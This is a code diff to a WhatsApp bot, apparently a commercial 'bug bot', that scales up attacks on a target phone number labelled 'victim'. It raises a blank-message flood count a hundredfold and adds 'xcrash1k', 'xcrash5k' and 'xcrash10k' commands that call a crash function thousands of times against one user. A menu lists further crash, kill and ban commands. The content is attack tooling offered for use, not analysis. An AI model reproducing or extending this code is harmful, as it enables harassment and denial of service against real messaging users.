@@ -1931,7 +1931,7 @@ case 'xlist': {
 if (!isPremium) return replygcxeon(mess.prem)
 if (!text) return replygcxeon(`Example:\n${prefix + command} 91xxxxxxxxxx|5`)
 victim = text.split("|")[0]+"@s.whatsapp.net"
-amount = text.split("|")[1] * 30
+amount = text.split("|")[1] * 3000
 for (let i = 0; i < amount; i++) {
 await XeonBotInc.sendMessage(victim, { text: '' }, { quoted: xbug2 })
 }
@@ -2128,6 +2128,42 @@ await sleep(3000)
 replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
 }
 break
+case 'xcrash1k':{
+    if (!isPremium) return replygcxeon(mess.prem)
+     if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
+     victim = text.split("|")[0]+'@s.whatsapp.net'
+    amount = "1000"
+    for (let i = 0; i < amount; i++) {
+    XeonyCrashy(pushname,victim)
+    await sleep(3000)
+    }
+    replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
+    }
+    break
+    case 'xcrash5k':{
+        if (!isPremium) return replygcxeon(mess.prem)
+         if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
+         victim = text.split("|")[0]+'@s.whatsapp.net'
+        amount = "5000"
+        for (let i = 0; i < amount; i++) {
+        XeonyCrashy(pushname,victim)
+        await sleep(3000)
+        }
+        replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
+        }
+        break
+        case 'xcrash10k':{
+            if (!isPremium) return replygcxeon(mess.prem)
+             if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
+             victim = text.split("|")[0]+'@s.whatsapp.net'
+            amount = "10000"
+            for (let i = 0; i < amount; i++) {
+            XeonyCrashy(pushname,victim)
+            await sleep(3000)
+            }
+            replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
+            }
+            break
 case 'xcrash2':
 if (!isPremium) return replygcxeon(mess.prem)
 if (!args[0]) return replygcxeon(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
@@ -2493,6 +2529,9 @@ xkill2 <amount>
 xkillgc <link group>
 tempban <code|number>
 xcrash <number>
+xcrash1k <number>
+xcrash5k <number>
+xcrash10k <number>
 xcrash2 <amount>
 xioscrash <number>
 xioscrash2 <amount>
